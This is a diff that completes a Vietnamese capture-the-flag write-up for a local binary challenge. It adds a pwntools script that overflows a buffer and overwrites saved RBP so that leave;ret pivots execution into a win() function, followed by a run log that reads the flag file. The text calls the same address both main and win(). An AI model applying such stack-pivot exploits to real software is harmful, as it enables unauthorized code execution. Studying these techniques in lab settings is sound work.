@@ -143,7 +143,42 @@ RBP  0x404900
 rbp         0x7ffce1907cf0 —▸ 0x7ffce1907d10
 ```
 * Ta thấy lúc này overwrite được rbp của hàm main, sau khi về hàm `main` thì rbp nhận giá trị mà ta đã overwrite.
-* (Còn tiếp)
+* Địa chỉ hàm main chương trình đã cung cấp tại `0x404850`
+* Vậy ta có script
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+exe = ELF("./chall5", checksec = False)
+
+p = process(exe.path)
+
+p.sendlineafter(b'> ', b'1')
+payload = b'A' * 32
+payload += p64(0x404848)
+
+p.sendafter(b'> ', payload)
+p.sendafter(b'> ', b'3')
+p.interactive()
+```
+
+* Ở đây có thể thấy địa chỉ win() là 0x404850 mà tại sao lại nhập là 0x404848? –> Lý do là leave ; ret tương ứng với mov rsp, rbp ; pop rbp. Vì vậy ta phải nhảy vào 0x404848 (0x404850 -8) và sau khi ret sẽ là 0x404850. Và pop nó xảy ra alignment, nên phải nhảy vào địa chỉ ở trước win() chứ không phải vào win() luôn.
+### Chạy thử
+```bash
+./solve5.py
+```
+```
+[+] Starting local process '/mnt/c/Users/ASUS/Downloads/chall5': pid 111322
+[*] Switching to interactive mode
+Thanks for coming!
+$ ls
+chall5   Flag.txt
+```
+```
+$ cat Flag.txt
+WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}$
+```
 
 
 
